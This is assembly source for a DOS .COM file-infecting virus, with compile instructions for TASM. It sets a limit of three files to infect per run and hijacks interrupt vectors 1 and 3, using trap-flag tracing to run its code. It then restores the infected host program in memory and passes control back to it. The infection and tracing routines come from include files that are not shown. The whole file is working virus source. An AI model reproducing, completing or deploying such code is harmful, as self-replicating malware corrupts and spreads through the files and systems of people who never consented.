; To compile: tasm main.asm
;             tlink main.obj /t
.model tiny
.386
.code
.startup
org 100h
inf_max equ     3                       ; files to infect each time
include macro.inc
s:
        pushf                           ;
        pusha                           ; save all regs & flags
        push es ds                      ;
        xor     ax,ax
        mov     ds,ax
        mov     bx,1*4                  ;
        push    wptr [bx]               ; save vector int1
        push    wptr [bx+2]
        push    cs
        pop     wptr [bx+2]             ; intercept int1
        mov     wptr [bx],ofs MyInt1
        mov     bx,3*4
        push    wptr [bx]               ;
        push    wptr [bx+2]             ; save vector int3
        push    cs
        pop     wptr [bx+2]             ; intercept int3
        mov     wptr [bx],ofs MyInt3
        push    cs
        pop     ds
        pushf
        pop     ax
        or      ax,0100h                ; TF=1
        push    ax
        push    cs
        lea     bp,cmdlist              ; command list begin
        push    wptr [bp]               ; offset 1st cmd/block
        mov     ax,wptr [bp+2]
        xor     ah,ah
        add     ax,wptr [bp]
        mov     cs:[_last],ax           ; _last = offset after cmd/block
        iret                            ; let's trace code.inc
sign:
restore:
        push    cs
        pop     ds
        lea     si,_rest                ; small sub for restore host
        xor     cx,cx
        mov     es,cx
        mov     bx,3*4
        pop     wptr es:[bx+2]          ; restore int3
        pop     wptr es:[bx]
        mov     bl,1*4
        pop     wptr es:[bx+2]          ; restore int1
        pop     wptr es:[bx]
        mov     di,4F0h
        mov     cl,_rest1-_rest
        push    es
        push    di
        rep     movsb                   ; move small sub to 0:4F0h
        push    cs
        pop     es
        mov     si,[oentry]             ; where old begin of host
        mov     di,100h                 ; original place
        mov     cx,vs                   ; virus size
        retf                            ; equ jmp _rest
_rest:  rep     movsb
        pop ds es
        popa
        popf
        push    ds
        push    si
        retf                            ; equ jmp cs:100h
_rest1:

include int.inc                         ; MyInt1 & MyInt3
include data.inc
include cmdlist.inc                     ; <offset cmd/block>,<size cmd/block>
dataend:
include code.inc
endvir:
include host.inc                        ; host programm
e:
end
